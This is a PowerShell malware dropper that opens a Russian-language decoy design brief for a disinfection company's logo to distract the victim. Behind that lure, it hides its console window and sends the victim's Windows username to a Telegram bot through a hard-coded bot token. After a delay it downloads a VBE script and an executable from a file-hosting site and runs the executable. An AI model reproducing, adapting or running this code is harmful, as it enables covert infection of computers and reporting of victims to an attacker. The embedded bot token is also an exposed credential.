Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="МСД 2026.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
ТЗ — Новый логотип для службы дезинфекции МСД

Возможные цвета:
- Голубой и белый
- Бирюзовый, тёмно‑серый и белый
- Мятно‑зелёный, тёмно‑синий и белый

Варианты дизайна:
1. Щит с буквами МСД и рисунком распылителя.
2. Капля с крестом или плюсом внутри. Текст – рядом.
3. Монограмма MSD в виде распылителя или маски.
4. Круглый знак с волнами, символизирующими обработку. Текст тоже нужен.
5. Простой рисунок защитного костюма или маски в щите или прямоугольнике.
6. Схематичное изображение молекулы с точкой распыления в центре. Текст – справа.

Дополняющая информация:

Цель проекта
Обновить логотип так, чтобы он отражал профессионализм, надёжность и сферу деятельности (дезинфекция), сохранив узнаваемость бренда.

Требования к версиям логотипа
- Основная цветная версия.
- Инвертированная версия (для тёмного фона).
- Монохромная версия (чёрно‑белая).
- Упрощённый знак для иконок и фавиконов.
- Горизонтальная и вертикальная компоновки.
- Минимальная зона отчуждения и минимальный размер должны быть определены в макете.

Технические требования
- Все элементы в векторе; текстовые элементы оставлять редактируемыми до финализации.
- Рекомендации по применению: примеры на светлом и тёмном фоне, правила размещения на фото и паттернах.

Файлы на выходе
- Исходники в векторе (AI и/или SVG) с редактируемыми слоями.
- PDF для печати (включая версию с обрезными метками).
- PNG с прозрачным фоном в нескольких размерах; JPG для превью.
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/OcWQ/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit